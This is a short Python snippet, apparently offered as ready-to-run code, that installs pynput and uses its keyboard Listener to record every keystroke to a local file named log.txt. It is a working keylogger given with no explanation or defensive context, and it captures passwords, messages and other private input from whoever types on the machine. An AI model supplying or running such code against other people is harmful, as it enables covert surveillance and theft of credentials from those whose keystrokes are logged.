#install library #
pip install pynput
#code#
from pynput.keyboard import Listener

def log_keystroke(key):
    key = str(key).replace("'", "")
    with open("log.txt", "a") as f:
        f.write(key + "\n")

with Listener(on_press=log_keystroke) as listener:
    listener.join()
